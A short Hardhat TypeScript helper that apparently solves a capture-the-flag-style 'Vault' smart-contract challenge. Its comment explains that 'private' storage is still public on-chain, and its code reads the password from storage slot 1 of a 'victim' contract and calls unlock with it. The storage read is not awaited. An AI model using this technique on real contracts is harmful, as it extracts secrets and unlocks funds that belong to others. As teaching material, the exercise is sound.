import { ethers } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Declaring a storage variable as "private" only prevents other contracts
    from reading it. But data on a blockchain will always be public!

    Smart contract's storage variables are store in "slots" of 32 bytes,
    and it'll pack values together if they fit in 32 bytes.

    `Vault` has 2 storage variables `locked` and `password`.
    `locked` is a `bool`, and it only takes 1 byte.
    `password` is a `bytes32`, so it takes 32 bytes.

    Therefore =>
    slot 0: locked
    slot 1: password
  */
  const password = ethers.provider.getStorageAt(victim.address, 1);

  await victim.unlock(password);
};

export default helper;
